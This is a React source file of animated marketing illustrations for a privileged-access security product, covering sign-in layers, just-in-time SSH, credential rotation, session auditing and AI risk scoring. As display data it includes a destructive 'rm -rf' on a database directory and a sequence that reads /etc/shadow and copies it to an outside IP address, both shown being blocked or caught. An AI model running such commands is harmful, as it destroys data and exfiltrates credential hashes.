"use client";

import { useEffect, useRef, useState } from "react";
import { motion, useInView, useReducedMotion } from "framer-motion";
import {
    Activity,
    Ban,
    Bot,
    Check,
    Clock,
    FileCheck2,
    Fingerprint,
    KeyRound,
    Layers,
    Lock,
    Network,
    RotateCcw,
    ScanSearch,
    Share2,
    ShieldCheck,
    Terminal,
    Upload,
    UserCheck,
    Video,
    X,
} from "lucide-react";

/*
 * Illustrations for /features. Users, assets, counts and scores are
 * illustrative; the feature names they show come from the page copy.
 */

const ease = [0.23, 1, 0.32, 1] as const;

function useLoop(steps: number, ms: number, amount = 0.4) {
    const reduce = useReducedMotion();
    const ref = useRef<HTMLDivElement>(null);
    const seen = useInView(ref, { amount });
    const [i, setI] = useState(0);
    useEffect(() => {
        if (reduce || !seen) return;
        const t = window.setInterval(() => setI((v) => (v + 1) % steps), ms);
        return () => window.clearInterval(t);
    }, [seen, reduce, steps, ms]);
    return { ref, i: reduce ? steps - 1 : i, reduce: !!reduce };
}

function Bar({ icon: Icon, title, right }: { icon: React.ComponentType<{ className?: string }>; title: string; right?: React.ReactNode }) {
    return (
        <div className="flex items-center gap-2 px-4 h-11 border-b border-white/[0.08]">
            <Icon className="w-4 h-4 shrink-0 text-[#7FE3F2]" />
            <span className="text-[0.75rem] font-mono text-slate-400 truncate">{title}</span>
            <span className="ml-auto shrink-0 text-[0.6875rem] font-mono text-slate-500">{right ?? "illustrative"}</span>
        </div>
    );
}

/* ─── Hero: one privileged request touching all five capability areas ─── */
const AREAS = [
    { t: "Authentication", d: "j.carter · FIDO2 key · AD synced", i: Fingerprint },
    { t: "Authorization", d: "role db-admin · JIT 30 min · approved", i: UserCheck },
    { t: "Account management", d: "credential injected · rotated after", i: KeyRound },
    { t: "Audit & compliance", d: "session recorded · streamed to SIEM", i: Video },
    { t: "AI & automation", d: "behaviour scored · 0.12 · normal", i: Bot },
];
export function FeaturesHero() {
    const { ref, i, reduce } = useLoop(AREAS.length + 2, 1000, 0.3);
    const n = reduce ? AREAS.length : Math.min(i + 1, AREAS.length);
    return (
        <div ref={ref} className="aip-console relative overflow-hidden" role="img" aria-label="Illustration: one privileged request passes through all five OmniPriv capability areas in turn: authentication with a hardware key, authorization with a just-in-time approved role, account management injecting and rotating the credential, audit recording the session and streaming it to SIEM, and the AI engine scoring the behaviour">
            <div className="flex items-center gap-2 px-4 h-11 border-b border-white/[0.08]">
                <span className="w-2.5 h-2.5 rounded-full bg-white/15" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/15" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/15" />
                <span className="ml-3 text-[0.75rem] font-mono text-slate-400 truncate">One request · every capability area</span>
            </div>
            <div className="flex min-w-0 items-center gap-3 px-4 pt-4" aria-hidden="true">
                <span className="inline-flex w-10 h-10 shrink-0 items-center justify-center rounded-xl bg-[#00B8DB]/15 text-[#7FE3F2]">
                    <Terminal className="w-5 h-5" />
                </span>
                <span className="min-w-0">
                    <span className="block truncate font-mono text-[0.8125rem] font-semibold text-white">ssh j.carter@sql-prod-02</span>
                    <span className="block truncate text-[0.6875rem] text-slate-500">privileged request · through OmniPriv</span>
                </span>
            </div>
            <ol className="relative p-4 space-y-2" aria-hidden="true">
                <span className="absolute left-[2.1rem] top-6 bottom-6 w-px bg-white/[0.08]" />
                {AREAS.map((a, k) => {
                    const on = k < n;
                    const cur = k === n - 1 && i < AREAS.length;
                    return (
                        <li key={a.t} className={`relative grid grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-3 rounded-xl border px-3 py-2.5 transition-colors duration-300 ${cur ? "border-[#00B8DB]/50 bg-[#00B8DB]/[0.08]" : on ? "border-white/[0.08] bg-white/[0.03]" : "border-white/[0.04]"}`}>
                            <span className={`relative inline-flex w-8 h-8 items-center justify-center rounded-lg transition-colors duration-300 ${on ? "bg-[#0d2a33] text-[#7FE3F2]" : "bg-[#111418] text-slate-600"}`}>
                                <a.i className="w-4 h-4" />
                            </span>
                            <span className="min-w-0">
                                <span className={`block truncate text-[0.8125rem] font-semibold ${on ? "text-white" : "text-slate-600"}`}>{a.t}</span>
                                <motion.span initial={false} animate={{ opacity: on ? 1 : 0 }} transition={{ duration: 0.3 }} className="block truncate font-mono text-[0.6875rem] text-slate-400">
                                    {a.d}
                                </motion.span>
                            </span>
                            {on ? <Check className="w-4 h-4 text-emerald-400" strokeWidth={3} /> : <span className="w-4" />}
                        </li>
                    );
                })}
            </ol>
            <div className="flex items-center justify-between gap-3 px-4 h-10 border-t border-white/[0.08] text-[0.6875rem] text-slate-500">
                <span className="truncate">{n === AREAS.length ? "Five areas, one platform, one record" : "Checking each layer"}</span>
                <span className="font-mono shrink-0">illustrative</span>
            </div>
        </div>
    );
}

/* ─── Authentication: a sign-in, layer by layer ─── */
const LOGIN = [
    { t: "CAPTCHA", d: "automated attempt filtered", i: ShieldCheck },
    { t: "Directory", d: "j.carter found · AD group db-admins", i: Network },
    { t: "Single sign-on", d: "SAML 2.0 assertion accepted", i: Layers },
    { t: "Multi-factor", d: "FIDO2 / WebAuthn key touched", i: Fingerprint },
    { t: "Conditional access", d: "office · managed device · 09:12 · low risk", i: Activity },
];
export function LoginLayers() {
    const { ref, i, reduce } = useLoop(LOGIN.length + 2, 900, 0.4);
    const n = reduce ? LOGIN.length : Math.min(i + 1, LOGIN.length);
    const done = n === LOGIN.length;
    return (
        <div ref={ref} className="aip-console overflow-hidden" role="img" aria-label="Illustration: a privileged sign-in passes CAPTCHA, a directory lookup in Active Directory, single sign-on, a FIDO2 hardware key and a conditional access check on location, device, time and risk before it is allowed">
            <Bar icon={Fingerprint} title="sign-in · j.carter" />
            <ol className="p-4 space-y-1.5" aria-hidden="true">
                {LOGIN.map((s, k) => {
                    const on = k < n;
                    return (
                        <li key={s.t} className={`grid grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-3 rounded-lg border px-3 py-2 transition-colors duration-300 ${on ? "border-white/[0.09] bg-white/[0.03]" : "border-white/[0.04]"}`}>
                            <s.i className={`w-4 h-4 ${on ? "text-[#7FE3F2]" : "text-slate-600"}`} />
                            <span className="min-w-0">
                                <span className={`block text-[0.75rem] font-semibold ${on ? "text-white" : "text-slate-600"}`}>{s.t}</span>
                                <span className={`block truncate text-[0.6875rem] ${on ? "text-slate-400" : "text-slate-700"}`}>{s.d}</span>
                            </span>
                            {on ? <Check className="w-3.5 h-3.5 text-[#7FE3F2]" strokeWidth={3} /> : <span className="w-3.5" />}
                        </li>
                    );
                })}
            </ol>
            <div className={`mx-4 mb-4 flex items-center gap-2 rounded-xl border px-3.5 py-2.5 text-[0.75rem] font-semibold transition-colors duration-300 ${done ? "border-emerald-400/35 bg-emerald-400/[0.08] text-emerald-300" : "border-white/[0.07] text-slate-500"}`}>
                <ShieldCheck className="w-4 h-4 shrink-0" /> {done ? "Identity verified, on top of your existing directory" : "Verifying"}
            </div>
        </div>
    );
}

/* ─── Authorization: a JIT SSH session with command-level controls ─── */
const CMDS = [
    { c: "systemctl status mssql", ok: true },
    { c: "tail -n 50 /var/log/mssql/errorlog", ok: true },
    { c: "rm -rf /var/opt/mssql/data", ok: false },
    { c: "systemctl restart mssql", ok: true },
];
export function JitTerminal() {
    const { ref, i, reduce } = useLoop(CMDS.length + 2, 1200, 0.4);
    const n = reduce ? CMDS.length : Math.min(i + 1, CMDS.length);
    const mins = Math.max(1, 30 - n * 6);
    return (
        <div ref={ref} className="aip-console overflow-hidden" role="img" aria-label="Illustration: an approved just-in-time SSH session for the db-admin role runs routine commands, a destructive delete command is blocked in real time by command-level controls, and the access window counts down to automatic expiry">
            <Bar icon={Terminal} title="ssh · sql-prod-02 · role db-admin" right={<span className="inline-flex items-center gap-1 tabular-nums text-[#7FE3F2]"><Clock className="w-3 h-3" /> {mins} min left</span>} />
            <div className="flex flex-wrap gap-1.5 px-4 pt-4" aria-hidden="true">
                {["RBAC: db-admin", "JIT: 30 min", "IP 10.20.0.0/16", "Mon-Fri 08:00-18:00", "Approved: s.noor"].map((c) => (
                    <span key={c} className="rounded-md bg-white/[0.05] px-2 py-1 font-mono text-[0.625rem] text-slate-300">
                        {c}
                    </span>
                ))}
            </div>
            <ul className="p-4 space-y-1.5 font-mono text-[0.6875rem]" aria-hidden="true">
                {CMDS.map((c, k) => {
                    const on = k < n;
                    return (
                        <li key={c.c} className={`grid grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-2 rounded-lg border px-3 py-2 transition-colors duration-300 ${!on ? "border-white/[0.04] text-slate-700" : c.ok ? "border-white/[0.07] bg-white/[0.02] text-slate-200" : "border-rose-400/45 bg-rose-500/[0.08] text-rose-200"}`}>
                            <span className="text-[#7FE3F2]">$</span>
                            <span className={`truncate ${on && !c.ok ? "line-through decoration-rose-400/70" : ""}`}>{c.c}</span>
                            {on ? c.ok ? <Check className="w-3.5 h-3.5 text-[#7FE3F2]" strokeWidth={3} /> : <span className="inline-flex items-center gap-1 font-sans text-[0.625rem] font-semibold text-rose-300"><Ban className="w-3 h-3" /> blocked</span> : <span className="w-3.5" />}
                        </li>
                    );
                })}
            </ul>
            <div className="mx-4 mb-4 h-1.5 overflow-hidden rounded-full bg-white/[0.06]" aria-hidden="true">
                <motion.div className="h-full origin-left bg-[#00B8DB]" initial={false} animate={{ scaleX: mins / 30 }} transition={{ duration: 0.4, ease }} />
            </div>
        </div>
    );
}

/* ─── Account management: discover, rotate, push, across many assets at once ─── */
const GROUPS = [
    { t: "Windows servers", total: 1240 },
    { t: "Linux hosts · SSH keys", total: 860 },
    { t: "Databases", total: 312 },
    { t: "API tokens", total: 95 },
];
export function RotationRun() {
    const { ref, i, reduce } = useLoop(12, 500, 0.4);
    const p = reduce ? 1 : Math.min(i / 9, 1);
    const found = GROUPS.reduce((s, g) => s + g.total, 0);
    return (
        <div ref={ref} className="aip-console overflow-hidden" role="img" aria-label="Illustration: OmniPriv discovers privileged accounts across Windows servers, Linux hosts, databases and API tokens, rotates every credential in one run and pushes the new values to each target, with no user seeing a raw password">
            <Bar icon={RotateCcw} title="rotation run · scheduled 02:00" />
            <div className="grid grid-cols-3 gap-2 px-4 pt-4 text-center" aria-hidden="true">
                {[
                    { k: "Discovered", v: found.toLocaleString("en-US"), i: ScanSearch },
                    { k: "Rotated", v: Math.round(found * p).toLocaleString("en-US"), i: RotateCcw },
                    { k: "Pushed", v: Math.round(found * Math.max(0, p - 0.1) / 0.9).toLocaleString("en-US"), i: Upload },
                ].map((s) => (
                    <div key={s.k} className="rounded-xl border border-white/[0.07] bg-white/[0.02] px-2 py-2.5">
                        <s.i className="mx-auto w-4 h-4 text-[#7FE3F2]" />
                        <div className="mt-1 text-[0.9375rem] font-bold tabular-nums text-white">{s.v}</div>
                        <div className="text-[0.625rem] text-slate-500">{s.k}</div>
                    </div>
                ))}
            </div>
            <ul className="p-4 space-y-3" aria-hidden="true">
                {GROUPS.map((g, k) => {
                    const gp = Math.max(0, Math.min(1, p * 1.25 - k * 0.08));
                    return (
                        <li key={g.t}>
                            <div className="flex items-center justify-between gap-3 text-[0.6875rem]">
                                <span className="truncate text-slate-300">{g.t}</span>
                                <span className="tabular-nums text-slate-500">
                                    {Math.round(g.total * gp)} / {g.total}
                                </span>
                            </div>
                            <div className="mt-1.5 h-1.5 overflow-hidden rounded-full bg-white/[0.06]">
                                <motion.div className="h-full origin-left bg-[#00B8DB]" initial={false} animate={{ scaleX: gp }} transition={{ duration: 0.45, ease }} />
                            </div>
                        </li>
                    );
                })}
            </ul>
            <div className={`mx-4 mb-4 flex items-center gap-2 rounded-xl border px-3.5 py-2.5 text-[0.75rem] font-semibold transition-colors duration-300 ${p >= 1 ? "border-emerald-400/35 bg-emerald-400/[0.08] text-emerald-300" : "border-white/[0.07] text-slate-500"}`}>
                <Lock className="w-4 h-4 shrink-0" /> {p >= 1 ? "Rotated and pushed · no outages · nobody saw a password" : "Rotating in the vault"}
            </div>
        </div>
    );
}

/* ─── Audit: a live session watched, terminated and evidenced ─── */
const KEYS = ["sudo -i", "cat /etc/shadow", "scp /etc/shadow 203.0.113.9:"];
const FRAMEWORKS = ["SOC 2", "ISO 27001", "NIST SP 800-53", "HIPAA", "PCI DSS", "SOX 404"];
export function LiveAudit() {
    const { ref, i, reduce } = useLoop(KEYS.length + 4, 1000, 0.4);
    const n = reduce ? KEYS.length : Math.min(i + 1, KEYS.length);
    const killed = reduce || i >= KEYS.length;
    const events = 12840 + i * 37;
    return (
        <div ref={ref} className="aip-console overflow-hidden" role="img" aria-label="Illustration: a live privileged session is watched in real time with its command history; when it starts copying a sensitive file off the host, the session is terminated in one click, the events are streamed to the SIEM and the evidence feeds compliance reports for SOC 2, ISO 27001, NIST SP 800-53, HIPAA, PCI DSS and SOX 404">
            <Bar icon={Video} title="live session · vendor.acme@linux-prod-01" right={<span className={`inline-flex items-center gap-1.5 ${killed ? "text-slate-400" : "text-rose-300"}`}><span className={`w-1.5 h-1.5 rounded-full ${killed ? "bg-slate-500" : "bg-rose-400"}`} /> {killed ? "ended" : "LIVE"}</span>} />
            <ul className="p-4 space-y-1.5 font-mono text-[0.6875rem]" aria-hidden="true">
                {KEYS.map((c, k) => {
                    const on = k < n;
                    const bad = k === 2;
                    return (
                        <li key={c} className={`grid grid-cols-[auto_minmax(0,1fr)] gap-2 rounded-lg border px-3 py-2 transition-colors duration-300 ${!on ? "border-white/[0.04] text-slate-700" : bad ? "border-amber-400/45 bg-amber-400/[0.08] text-amber-100" : "border-white/[0.06] bg-white/[0.02] text-slate-300"}`}>
                            <span className="text-slate-500">{`0${k + 1}`}</span>
                            <span className="truncate">{c}</span>
                        </li>
                    );
                })}
            </ul>
            <div className="px-4" aria-hidden="true">
                <div className={`flex h-10 items-center gap-2 rounded-xl border px-3.5 text-[0.75rem] font-semibold transition-colors duration-300 ${killed ? "border-rose-400/40 bg-rose-500/[0.08] text-rose-300" : "border-white/[0.07] text-slate-500"}`}>
                    {killed ? <X className="w-4 h-4 shrink-0" strokeWidth={3} /> : <Activity className="w-4 h-4 shrink-0" />}
                    <span className="truncate">{killed ? "Session terminated by reviewer · user notified" : "Watching in real time"}</span>
                </div>
            </div>
            <div className="grid grid-cols-[minmax(0,1fr)_auto] items-center gap-3 px-4 pt-3" aria-hidden="true">
                <span className="flex min-w-0 items-center gap-2 text-[0.6875rem] text-slate-400">
                    <Share2 className="w-3.5 h-3.5 shrink-0 text-[#7FE3F2]" />
                    <span className="truncate">Streaming to SIEM over syslog</span>
                </span>
                <span className="font-mono text-[0.6875rem] tabular-nums text-slate-300">{events.toLocaleString("en-US")} events</span>
            </div>
            <div className="flex flex-wrap gap-1.5 p-4" aria-hidden="true">
                {FRAMEWORKS.map((f) => (
                    <span key={f} className="inline-flex items-center gap-1 rounded-md border border-[#00B8DB]/25 bg-[#00B8DB]/[0.06] px-2 py-1 text-[0.625rem] font-semibold text-[#7FE3F2]">
                        <FileCheck2 className="w-3 h-3" /> {f}
                    </span>
                ))}
            </div>
        </div>
    );
}

/* ─── AI & automation: a session score climbs through the escalation tiers ─── */
const SIGNALS = [
    { t: "Login at 03:14, outside baseline", s: 0.18 },
    { t: "Keystroke rhythm drift · MFA step-up", s: 0.2 },
    { t: "Credential harvesting pattern", s: 0.24 },
    { t: "Lateral movement to 4 hosts", s: 0.22 },
];
const TIERS = [
    { t: "Dashboard alert", at: 0.35 },
    { t: "Admin alert", at: 0.6 },
    { t: "Automatic block", at: 0.8 },
];
export function ScoreTiers() {
    const { ref, i, reduce } = useLoop(SIGNALS.length + 3, 1100, 0.4);
    const n = Math.min(i, SIGNALS.length);
    const score = SIGNALS.slice(0, n).reduce((s, x) => s + x.s, 0.04);
    return (
        <div ref={ref} className="aip-console overflow-hidden" role="img" aria-label="Illustration: the AI-PAM engine scores one session from 0 to 1 as signals arrive: an off-hours login, keystroke drift that triggers an MFA step-up, a credential harvesting pattern and lateral movement; the score passes the dashboard alert, admin alert and automatic block tiers">
            <Bar icon={Bot} title="AI-PAM engine · session score" right="0 to 1 · illustrative" />
            <div className="p-4" aria-hidden="true">
                <div className="flex items-end justify-between gap-3">
                    <div className="text-[2.25rem] leading-none font-bold tabular-nums text-white" style={{ fontFamily: "var(--font-syne)" }}>
                        {score.toFixed(2)}
                    </div>
                    <span className="text-[0.6875rem] text-slate-500">39 features · 10-second sweep</span>
                </div>
                <div className="relative mt-4 h-2.5 rounded-full bg-white/[0.06]">
                    <motion.span className="absolute inset-y-0 left-0 rounded-full bg-gradient-to-r from-[#00B8DB] via-amber-400 to-rose-500" initial={false} animate={{ width: `${Math.min(score, 1) * 100}%` }} transition={{ duration: 0.5, ease }} />
                    {TIERS.map((t) => (
                        <span key={t.t} className="absolute -top-1 -bottom-1 w-px bg-white/40" style={{ left: `${t.at * 100}%` }} />
                    ))}
                </div>
                <ul className="mt-4 grid grid-cols-3 gap-1.5">
                    {TIERS.map((t, k) => {
                        const on = score >= t.at;
                        const tone = k === 2 ? "border-rose-400/45 bg-rose-500/[0.1] text-rose-300" : k === 1 ? "border-amber-400/45 bg-amber-400/[0.1] text-amber-200" : "border-[#00B8DB]/45 bg-[#00B8DB]/[0.1] text-[#7FE3F2]";
                        return (
                            <li key={t.t} className={`truncate rounded-lg border px-1.5 py-2 text-center text-[0.625rem] font-semibold transition-colors duration-300 ${on ? tone : "border-white/[0.06] text-slate-600"}`}>
                                {t.t}
                            </li>
                        );
                    })}
                </ul>
                <ul className="mt-4 space-y-1.5">
                    {SIGNALS.map((s, k) => {
                        const on = k < n;
                        return (
                            <li key={s.t} className={`grid grid-cols-[minmax(0,1fr)_auto] items-center gap-3 rounded-lg border px-3 py-2 transition-colors duration-300 ${on ? "border-white/[0.09] bg-white/[0.03]" : "border-white/[0.04]"}`}>
                                <span className={`truncate text-[0.6875rem] ${on ? "text-slate-200" : "text-slate-600"}`}>{s.t}</span>
                                <span className={`font-mono text-[0.625rem] tabular-nums ${on ? "text-amber-200" : "text-slate-700"}`}>+{s.s.toFixed(2)}</span>
                            </li>
                        );
                    })}
                </ul>
            </div>
        </div>
    );
}
